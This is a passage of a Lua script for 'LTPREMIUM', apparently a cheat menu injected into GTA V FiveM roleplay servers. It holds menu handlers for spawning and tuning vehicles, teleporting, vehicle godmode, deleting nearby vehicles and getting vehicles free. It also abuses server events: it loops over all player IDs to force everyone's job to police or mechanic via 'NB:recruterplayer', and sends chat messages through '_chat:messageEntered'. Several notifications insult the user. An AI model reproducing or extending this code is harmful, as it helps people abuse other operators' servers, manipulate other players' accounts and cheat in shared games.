                        local ck=KeyboardInput("Enter message","",1000)
                        if ck then
                            TriggerServerEvent("_chat:messageEntered",da,{0,0x99,255},ck)
                        end
                    end
                elseif LTPREMIUM.Button("ESX Set All Police") then
                    for i = 0, 128 do
                        TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(i), "police", 3)
                        TriggerServerEvent("NB:recruterplayer", i, "police", 3)
                    end
                elseif LTPREMIUM.Button("ESX Set All Mechanic") then
                    for i = 0, 128 do
                        TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(i), "mecano", 3)
                        TriggerServerEvent("NB:recruterplayer", i, "mecano", 3)
                    end
                end

                LTPREMIUM.Display()
            elseif LTPREMIUM.IsMenuOpened("TeleportMenu") then
                if LTPREMIUM.Button("~b~TP~s~ To Your Waypoint") then
                    TeleportToWaypoint()
                elseif LTPREMIUM.Button("~b~TP~s~ Into Nearest Vehicle") then
                    teleportToNearestVehicle()
                elseif LTPREMIUM.Button("~b~TP~s~ To Coordinates") then
                    TeleportToCoords()
                elseif LTPREMIUM.CheckBox(
                    "Show Your Coordinates",
                    showCoords,
                    function(enabled)
                        showCoords = enabled
                    end)
                then
                end

                LTPREMIUM.Display()
			elseif LTPREMIUM.IsMenuOpened("AI") then
			                if LTPREMIUM.Button("~h~Configure The ~g~Speed") then
                    cspeed = KeyboardInput("Enter Wanted MaxSpeed", "", 100)
					local c1 = 1.0
					cspeed = tonumber(cspeed)
					if cspeed == nil then
											drawNotification(
                            '~~r~Invalid Speed you dumbass~s~.'
                        )
                        drawNotification(
                            '~r~Operation cancelled~s~.'
                        )
                    elseif cspeed then
                        ojtgh = (cspeed .. ".0")
                        SetDriveTaskMaxCruiseSpeed(GetPlayerPed(-1), tonumber(ojtgh))
                    end
					
                    SetDriverAbility(GetPlayerPed(-1), 100.0)
                elseif LTPREMIUM.Button("Drive to waypoint ~o~SLOW") then
                    if DoesBlipExist(GetFirstBlipInfoId(8)) then
                        local blipIterator = GetBlipInfoIdIterator(8)
                        local blip = GetFirstBlipInfoId(8, blipIterator)
                        local wp = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
                        local ped = GetPlayerPed(-1)
                        ClearPedTasks(ped)
                        local v = GetVehiclePedIsIn(ped, false)
                        TaskVehicleDriveToCoord(ped, v, wp.x, wp.y, wp.z, tonumber(ojtgh), 156, v, 5, 1.0, true)
                        SetDriveTaskDrivingStyle(ped, 8388636)
                        speedmit = true
                    end
                elseif LTPREMIUM.Button("Drive to waypoint ~g~FAST") then
                    if DoesBlipExist(GetFirstBlipInfoId(8)) then
                        local blipIterator = GetBlipInfoIdIterator(8)
                        local blip = GetFirstBlipInfoId(8, blipIterator)
                        local wp = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
                        local ped = GetPlayerPed(-1)
                        ClearPedTasks(ped)
                        local v = GetVehiclePedIsIn(ped, false)
                        TaskVehicleDriveToCoord(ped, v, wp.x, wp.y, wp.z, tonumber(ojtgh), 156, v, 2883621, 5.5, true)
                        SetDriveTaskDrivingStyle(ped, 2883621)
                        speedmit = true
                    end
                elseif LTPREMIUM.Button("Wander Around") then
                    local ped = GetPlayerPed(-1)
                    ClearPedTasks(ped)
                    local v = GetVehiclePedIsIn(ped, false)
                    print("Configured speed is currently " .. ojtgh)
                    TaskVehicleDriveWander(ped, v, tonumber(ojtgh), 8388636)
                elseif LTPREMIUM.Button("~h~~r~Stop AI") then
                    speedmit = false
                    if IsPedInAnyVehicle(GetPlayerPed(-1)) then
                        ClearPedTasks(GetPlayerPed(-1))
                    else
                        ClearPedTasksImmediately(GetPlayerPed(-1))
				    end
				end
				                LTPREMIUM.Display()
            elseif LTPREMIUM.IsMenuOpened("VehMenu") then
						if LTPREMIUM.Button("Remote Car") then
			RCCAR123 = KeyboardInput("Enter Car Name", "", 1000000)
			            if RCCAR123 and IsModelValid(RCCAR123) and IsModelAVehicle(RCCAR123) then
			RCCar.Start()
                    else
                        drawNotification("~r~Model Isn't Valid You Tard")
                    end
              elseif LTPREMIUM.MenuButton('~r~→  ~s~Vehicle List', 'CarTypes') then
		 elseif LTPREMIUM.Button("Spawn A Custom Vehicle") then
                    local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
                    if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
                        RequestModel(ModelName)
                        while not HasModelLoaded(ModelName) do
                            Citizen.Wait(-1000)
                        end

                        local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()), true, true)
                        if DelCurVeh then
                            DelVeh(GetVehiclePedIsUsing(PlayerPedId()))
                            drawNotification("Vehicle Just Got Deleted")
                        end
                            SetPedIntoVehicle(PlayerPedId(), veh, -1)
					local playerPed = GetPlayerPed(-1)
					local playerVeh = GetVehiclePedIsIn(playerPed, true)
						SetVehicleNumberPlateText(playerVeh, "LTMENU")
                    else
                        drawNotification("~r~Model Isn't Valid You Tard")
                    end
            elseif LTPREMIUM.Button("Repair Vehicle") then
                    SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
                    SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
                    SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
                    SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
                    Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
					elseif LTPREMIUM.Button("Repair Engine Only") then
					    local veh = GetVehiclePedIsIn(GetPlayerPed(-1), false)
    if not DoesEntityExist(veh) then
        drawNotification(
            "~r~You Aren't Sitting In A Vehicle Stupid"
        )
    else
				SetVehicleUndriveable(veh,false)
				SetVehicleEngineHealth(veh, 1000.0)
				SetVehiclePetrolTankHealth(veh, 1000.0)
				healthEngineLast=1000.0
				healthPetrolTankLast=1000.0
					SetVehicleEngineOn(veh, true, false )
				SetVehicleOilLevel(veh, 1000.0)
		end
						elseif LTPREMIUM.Button("~g~Buy vehicle for free") then fv()
				elseif
					LTPREMIUM.CheckBox(
					"~r~~h~Ultra Speed",
					Nigubdddddd,
					function(enabled)
					Nigubdddddd = enabled
					end)
				then
					elseif
					LTPREMIUM.CheckBox(
					"~w~Rainbow Vehicle Colour",
					RainbowVeh,
					function(enabled)
					RainbowVeh = enabled
					end)
				then
				elseif
					LTPREMIUM.CheckBox(
					"~w~Rainbow Vehicle Neon",
					ou328hNeon,
					function(enabled)
					ou328hNeon = enabled
					end)
				then
				elseif
					LTPREMIUM.CheckBox(
					"~w~Rainbow Sync",
					ou328hSync,
					function(enabled)
					ou328hSync = enabled
					end)
				then
				elseif
					LTPREMIUM.CheckBox(
					"Keep Vehicle Clean",
					LOJWDNDDNDN,
					function(enabled)
					LOJWDNDDNDN = enabled
					end)
				then
                elseif LTPREMIUM.MenuButton("~r~→  ~s~LS Customs", "LSC") then
				                elseif
                    LTPREMIUM.CheckBox(
                        'Speedboost ~g~SHIFT ~r~CTRL',
                        VehSpeed,
                        function(dl)
                            VehSpeed = dl
                        end
                    )
                 then
                elseif LTPREMIUM.Button("Delete Vehicle") then
                    DelVeh(GetVehiclePedIsUsing(PlayerPedId()))
				elseif LTPREMIUM.Button("Delete Closest Vehicle") then
                        local PlayerCoords = GetEntityCoords(PlayerPedId())
                        DelVeh(GetClosestVehicle(PlayerCoords.x, PlayerCoords.y, PlayerCoords.z, 1000.0, 0, 4))
				elseif
					LTPREMIUM.CheckBox(
						"No Fall",
						Nofall,
						function(enabled)
							Nofall = enabled

							SetPedCanBeKnockedOffVehicle(PlayerPedId(), Nofall)
						end
					)
				 then
				elseif LTPREMIUM.Button("Change license plate") then
					local playerPed = GetPlayerPed(-1)
					local playerVeh = GetVehiclePedIsIn(playerPed, true)
					local result = KeyboardInput("Enter the plate license you want", "", 10)
					if result then
						SetVehicleNumberPlateText(playerVeh, result)
						end
						                elseif LTPREMIUM.CheckBox(
                    "Vehicle Godmode",
                    VehGod,
                    function(enabled)
                        VehGod = enabled
                    end)
                then
				elseif LTPREMIUM.Button("Flip Up Vehicle") then
				local ped = GetPlayerPed(-1)
		        local veh = GetVehiclePedIsIn(ped)
	             FreezeEntityPosition(veh,false)
	             SetVehicleOnGroundProperly(veh)
	            SetVehicleEngineOn(veh, true)
				elseif LTPREMIUM.Button("Make vehicle dirty") then
					Clean(GetVehiclePedIsUsing(PlayerPedId()))
					drawNotification("~r~Vehicle is now dirty")
				elseif LTPREMIUM.Button("Make vehicle clean") then
					Clean2(GetVehiclePedIsUsing(PlayerPedId()))
					drawNotification("~r~Vehicle is now clean")
                end

                LTPREMIUM.Display()
			elseif LTPREMIUM.IsMenuOpened("tunings") then 
                    veh = GetVehiclePedIsUsing(PlayerPedId()) 
                    for i, dA in pairs(bd) do
                        if dA.
                    id == "extra"
                    and# checkValidVehicleExtras()  ~= 0 then
                    if LTPREMIUM.MenuButton(dA.name, dA.id) then end elseif dA.id == "neon"
                    then
                    if LTPREMIUM.MenuButton(dA.name, dA.id) then end elseif dA.id == "paint"
                    then
                    if LTPREMIUM.MenuButton(dA.name, dA.id) then end elseif dA.id == "wheeltypes" 
                    then
                    if LTPREMIUM.MenuButton(dA.name, dA.id) then end elseif dA.id == "headlight"
                    then
                    if LTPREMIUM.MenuButton(dA.name, dA.id) then end
                    else local as = checkValidVehicleMods(dA.id) for dG, dH in pairs(as) do
                        if LTPREMIUM.MenuButton(dA.name, dA.id) then end;
                    break end end end;
                    if IsToggleModOn(veh, 22) then xenonStatus = "Installed"
                    else xenonStatus = "Not Installed"
                    end;
                    if LTPREMIUM.Button("Xenon Headlight", xenonStatus) then
                    if not IsToggleModOn(veh, 22) then ToggleVehicleMod(veh, 22, not IsToggleModOn(veh, 22))
                    else ToggleVehicleMod(veh, 22, not IsToggleModOn(veh, 22)) end end; 
                    
                    LTPREMIUM.Display() 
                elseif LTPREMIUM.IsMenuOpened("performance") then 
                    veh = GetVehiclePedIsUsing(PlayerPedId()) 
                    for i, dA in pairs(be) do
                        if LTPREMIUM.MenuButton(dA.name, dA.id) then 
                        end 
                    end
                    if IsToggleModOn(veh, 18) then 
                        turboStatus = "Installed"
                    else 
                        turboStatus = "Not Installed"
                    end
                    if LTPREMIUM.Button("Turbo Tune", turboStatus) then
                        if not IsToggleModOn(veh, 18) then 
                            ToggleVehicleMod(veh, 18, not IsToggleModOn(veh, 18))
                        else 
                            ToggleVehicleMod(veh, 18, not IsToggleModOn(veh, 18)) 
                        end 
                    end 
                    LTPREMIUM.Display() elseif LTPREMIUM.IsMenuOpened("primary") then LTPREMIUM.MenuButton("~r~→  ~s~Classic", "classic1") LTPREMIUM.MenuButton("~r~→  ~s~Metallic", "metallic1") LTPREMIUM.MenuButton("~r~→  ~s~Matte", "matte1") LTPREMIUM.MenuButton("~r~→  ~s~Metal", "metal1") LTPREMIUM.Display() elseif LTPREMIUM.IsMenuOpened("secondary") then LTPREMIUM.MenuButton("~r~→  ~s~Classic", "classic2") LTPREMIUM.MenuButton("~r~→  ~s~Metallic", "metallic2") LTPREMIUM.MenuButton("~r~→  ~s~Matte", "matte2") LTPREMIUM.MenuButton("~r~→  ~s~Metal", "metal2") LTPREMIUM.Display() elseif LTPREMIUM.IsMenuOpened("rimpaint") then LTPREMIUM.MenuButton("~r~→  ~s~Classic", "classic3") LTPREMIUM.MenuButton("~r~→  ~s~Metallic", "metallic3") LTPREMIUM.MenuButton("~r~→  ~s~Matte", "matte3") LTPREMIUM.MenuButton("~r~→  ~s~Metal", "metal3") LTPREMIUM.Display() elseif LTPREMIUM.IsMenuOpened("classic1") then
                    for dS, dT in pairs(bg) do tp, ts = GetVehicleColours(veh) if tp ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and tp == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    end end; curprim, cursec = GetVehicleColours(veh) if LTPREMIUM.Button(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true elseif b8 and curprim == dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = false; ba = -1; b9 = -1 elseif b8 and curprim ~= dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true end end end; LTPREMIUM.Display() elseif LTPREMIUM.IsMenuOpened("metallic1") then
                    for dS, dT in pairs(bg) do tp, ts = GetVehicleColours(veh) if tp ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and tp == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    end end; curprim, cursec = GetVehicleColours(veh) if LTPREMIUM.Button(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true elseif b8 and curprim == dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = false; ba = -1; b9 = -1 elseif b8 and curprim ~= dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true end end end; LTPREMIUM.Display() elseif LTPREMIUM.IsMenuOpened("matte1") then
                    for dS, dT in pairs(bi) do tp, ts = GetVehicleColours(veh) if tp ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and tp == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    end end; curprim, cursec = GetVehicleColours(veh) if LTPREMIUM.Button(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleColours(veh, dT.id, oldsec) b8 = true elseif b8 and curprim == dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = false; ba = -1; b9 = -1 elseif b8 and curprim ~= dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true end end end; LTPREMIUM.Display() elseif LTPREMIUM.IsMenuOpened("metal1") then
                    for dS, dT in pairs(bj) do tp, ts = GetVehicleColours(veh) if tp ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and tp == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    end end; curprim, cursec = GetVehicleColours(veh) if LTPREMIUM.Button(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) SetVehicleColours(veh, dT.id, oldsec) b8 = true elseif b8 and curprim == dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = false; ba = -1; b9 = -1 elseif b8 and curprim ~= dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true end end end; LTPREMIUM.Display() elseif LTPREMIUM.IsMenuOpened("classic2") then
                    for dS, dT in pairs(bg) do tp, ts = GetVehicleColours(veh) if ts ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and ts == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    end end; curprim, cursec = GetVehicleColours(veh) if LTPREMIUM.Button(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) b9 = table.pack(oldprim, oldsec) SetVehicleColours(veh, oldprim, dT.id) b8 = true elseif b8 and cursec == dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and cursec ~= dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = true end end end; LTPREMIUM.Display() elseif LTPREMIUM.IsMenuOpened("metallic2") then
                    for dS, dT in pairs(bg) do tp, ts = GetVehicleColours(veh) if ts ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and ts == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    end end; curprim, cursec = GetVehicleColours(veh) if LTPREMIUM.Button(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) b9 = table.pack(oldprim, oldsec) SetVehicleColours(veh, oldprim, dT.id) b8 = true elseif b8 and cursec == dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and cursec ~= dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = true end end end; LTPREMIUM.Display() elseif LTPREMIUM.IsMenuOpened("matte2") then
                    for dS, dT in pairs(bi) do tp, ts = GetVehicleColours(veh) if ts ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and ts == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    end end; curprim, cursec = GetVehicleColours(veh) if LTPREMIUM.Button(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) b9 = table.pack(oldprim, oldsec) SetVehicleColours(veh, oldprim, dT.id) b8 = true elseif b8 and cursec == dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and cursec ~= dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = true end end end; LTPREMIUM.Display() elseif LTPREMIUM.IsMenuOpened("metal2") then
                    for dS, dT in pairs(bj) do tp, ts = GetVehicleColours(veh) if ts ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and ts == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    end end; curprim, cursec = GetVehicleColours(veh) if LTPREMIUM.Button(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) b9 = table.pack(oldprim, oldsec) SetVehicleColours(veh, oldprim, dT.id) b8 = true elseif b8 and cursec == dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and cursec ~= dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = true end end end; LTPREMIUM.Display() elseif LTPREMIUM.IsMenuOpened("classic3") then
                    for dS, dT in pairs(bg) do _, ts = GetVehicleExtraColours(veh) if ts ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and ts == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    end end; _, currims = GetVehicleExtraColours(veh) if LTPREMIUM.Button(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true elseif b8 and currims == dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and currims ~= dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true end end end; LTPREMIUM.Display() elseif LTPREMIUM.IsMenuOpened("metallic3") then
                    for dS, dT in pairs(bg) do _, ts = GetVehicleExtraColours(veh) if ts ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and ts == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    end end; _, currims = GetVehicleExtraColours(veh) if LTPREMIUM.Button(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true elseif b8 and currims == dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and currims ~= dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true end end end; LTPREMIUM.Display() elseif LTPREMIUM.IsMenuOpened("matte3") then
                    for dS, dT in pairs(bi) do _, ts = GetVehicleExtraColours(veh) if ts ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and ts == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    end end; _, currims = GetVehicleExtraColours(veh) if LTPREMIUM.Button(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true elseif b8 and currims == dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and currims ~= dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true end end end; LTPREMIUM.Display() elseif LTPREMIUM.IsMenuOpened("metal3") then
                    for dS, dT in pairs(bj) do _, ts = GetVehicleExtraColours(veh) if ts ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and ts == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    end end; _, currims = GetVehicleExtraColours(veh) if LTPREMIUM.Button(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = false
                     oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) 
                     b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) 
                     SetVehicleExtraColours(veh, oldpearl, dT.id) 
                     b8 = true elseif b8 and currims == dT.id then 
                        SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and currims ~= dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true end end end;
    
                    LTPREMIUM.Display()
            elseif LTPREMIUM.IsMenuOpened("LSC") then
			local veh = GetVehiclePedIsUsing(PlayerPedId())
					if LTPREMIUM.MenuButton('~r~→  ~s~~y~Handling ~s~editor', 'Hedit') then
		elseif LTPREMIUM.MenuButton("~r~→  ~s~~g~Performance ~s~Tuning", "performance") then
        elseif LTPREMIUM.MenuButton("~r~→  ~s~~b~Exterior ~s~Tuning", "tunings") then
                elseif LTPREMIUM.CheckBox(
                    "Super Handling",
                    superGrip,
                    function(enabled)
                        superGrip = enabled
                        enchancedGrip = false
                        driftMode = false
                        fdMode = false
                    end)
                then
                elseif LTPREMIUM.CheckBox(
                    "Enhanced Grip",
                    enchancedGrip,
                    function(enabled)
                        superGrip = false
                        enchancedGrip = enabled
                        driftMode = false
                        fdMode = false
                    end)
                then
                elseif LTPREMIUM.CheckBox(
                    "Drift Mode",
                    driftMode,
                    function(enabled)
                        superGrip = false
                        enchancedGrip = false
                        driftMode = enabled
                        fdMode = false
                    end)
                then
                elseif LTPREMIUM.CheckBox(
                    "Formula Drift Mode",
                    fdMode,
                    function(enabled)
                        superGrip = false
                        enchancedGrip = false
                        driftMode = false
                        fdMode = enabled
                    end)
                then
                elseif LTPREMIUM.MenuButton("~r~→  ~s~Vehicle Boost", "VehBoostMenu") then
                elseif LTPREMIUM.Button("Max Exterior Tuning") then
                    MaxOut(GetVehiclePedIsUsing(PlayerPedId()))
                elseif LTPREMIUM.Button("Max Performance") then
                    MaxOutPerf(GetVehiclePedIsUsing(PlayerPedId()))
                end

                LTPREMIUM.Display()
		elseif LTPREMIUM.IsMenuOpened("Hedit") then
		if GetVehiclePedIsIn( PlayerPedId(), false ) ~= 0 then
						if LTPREMIUM.Button('Refresh Info') then
                            chdata = GetAllVehicleHandlingData( GetVehiclePedIsIn( PlayerPedId(), false ) ) 
							end
			for i,theKey in pairs(chdata) do
				if tonumber(theKey.value) then 
					theKey.value = math.floor(tonumber(theKey.value) * 10^(3) + 0.5) / 10^(3)
				end
				if type(theKey.value) == "vector3" then
					local v1,v2,v3 = table.unpack(theKey.value)
					theKey.value = v1..","..v2..","..v3
				end
				theKey.value = tostring(theKey.value)
				
				if theKey.value and LTPREMIUM.Button(theKey.name, theKey.value) then 
						
					
						
					AddTextEntry('FMMC_KEY_TIP12N', "Enter new "..theKey.name.." value :") 

					DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP12N", "", theKey.value, "", "", "", 128 + 1)
				
					while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
						Citizen.Wait( 0 )
					end
				
					local result = GetOnscreenKeyboardResult()
					if result then
					
						if theKey.type == "vector3" then
							local x,y,z = table.unpack( mysplit( result, "," ) )
							if x and y and z then
								result = vector3(tonumber(x),tonumber(y),tonumber(z))
							else
								break
							end
						end
						
			
								
						SetVehicleHandlingData( GetVehiclePedIsIn( PlayerPedId(),false), theKey.name, result ) 
						Wait(200)
						chdata = GetAllVehicleHandlingData( GetVehiclePedIsIn( PlayerPedId(), false ) )
					end
					
					
				end
			end
        else
		drawNotification("You're not sitting in a vehicle IDIOT!")
			end
		LTPREMIUM.Display()
            elseif LTPREMIUM.IsMenuOpened('CarTypes') then
                for i, ex in ipairs(b3) do
                    if LTPREMIUM.MenuButton('~r~→  ~s~' .. ex, 'CarTypeSelection') then
                        carTypeIdx = i
                    end
                end
                LTPREMIUM.Display()
            elseif LTPREMIUM.IsMenuOpened('CarTypeSelection') then
                for i, ex in ipairs(b4[carTypeIdx]) do
                    if LTPREMIUM.MenuButton('~r~→  ~s~' .. ex, 'CarOptions') then
                        carToSpawn = i
                    end
                end
                LTPREMIUM.Display()
            elseif LTPREMIUM.IsMenuOpened('CarOptions') then
                if LTPREMIUM.Button('Spawn Infront Of You') then
                    local x, y, z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
                    local veh = b4[carTypeIdx][carToSpawn]
                    if veh == nil then
                        veh = 'adder'
                    end
                    vehiclehash = GetHashKey(veh)
                    RequestModel(vehiclehash)
                    Citizen.CreateThread(
                        function()
                            local ey = 0
                            while not HasModelLoaded(vehiclehash) do
                                ey = ey + 100
                                Citizen.Wait(-1000)
                                if ey > 5000 then
                                    ShowNotification('~h~~r~Cannot spawn this vehicle.')
                                    break
                                end
                            end
                            SpawnedCar =
                                CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1)) + 90, 1, 0)
                            SetVehicleStrong(SpawnedCar, true)
                            SetVehicleEngineOn(SpawnedCar, true, true, false)
                            SetVehicleEngineCanDegrade(SpawnedCar, false)
                        end
                    )
				elseif LTPREMIUM.Button('Spawn In It') then
                    local x, y, z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
                    local veh = b4[carTypeIdx][carToSpawn]
                    if veh == nil then
                        veh = 'adder'
                    end
                    vehiclehash = GetHashKey(veh)
                    RequestModel(vehiclehash)
                    Citizen.CreateThread(
                        function()
                            local ey = 0
                            while not HasModelLoaded(vehiclehash) do
                                ey = ey + 100
                                Citizen.Wait(-1000)
                                if ey > 5000 then
                                    ShowNotification('~h~~r~Cannot spawn this vehicle.')
                                    break
                                end
                            end
                            SpawnedCar =
                                CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1)) + 90, 1, 0)
                            SetVehicleStrong(SpawnedCar, true)
							SetPedIntoVehicle(PlayerPedId(), SpawnedCar, -1)
                            SetVehicleEngineOn(SpawnedCar, true, true, false)
                            SetVehicleEngineCanDegrade(SpawnedCar, false)
                        end
                    )
                end
                LTPREMIUM.Display()
            elseif LTPREMIUM.IsMenuOpened('MainTrailer') then
                if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
                    for i, ex in ipairs(b5) do
                        if LTPREMIUM.MenuButton('~r~→  ~s~' .. ex, 'MainTrailerSpa') then
                            TrailerToSpawn = i
                        end
                    end
                else
                    av('~h~~w~Not in a vehicle', true)
                end
                LTPREMIUM.Display()
            elseif LTPREMIUM.IsMenuOpened('MainTrailerSpa') then
                if LTPREMIUM.Button('Spawn Vehicle') then
                    local x, y, z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
                    local veh = b5[TrailerToSpawn]
                    if veh == nil then
                        veh = 'adder'
                    end
                    vehiclehash = GetHashKey(veh)
                    RequestModel(vehiclehash)
                    Citizen.CreateThread(
                        function()
                            local ey = 0
                            while not HasModelLoaded(vehiclehash) do
                                ey = ey + 100
                                Citizen.Wait(-1000)
                                if ey > 5000 then
                                    ShowNotification('~h~~r~Cannot spawn this vehicle.')
                                    break
                                end
                            end
                            local SpawnedCar =
                                CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1)) + 90, 1, 0)
                            local ez = GetVehiclePedIsUsing(GetPlayerPed(-1))
                            AttachVehicleToTrailer(Usercar, SpawnedCar, 50.0)
                            SetVehicleStrong(SpawnedCar, true)
                            SetVehicleEngineOn(SpawnedCar, true, true, false)
                            SetVehicleEngineCanDegrade(SpawnedCar, false)
                        end
                    )
                end
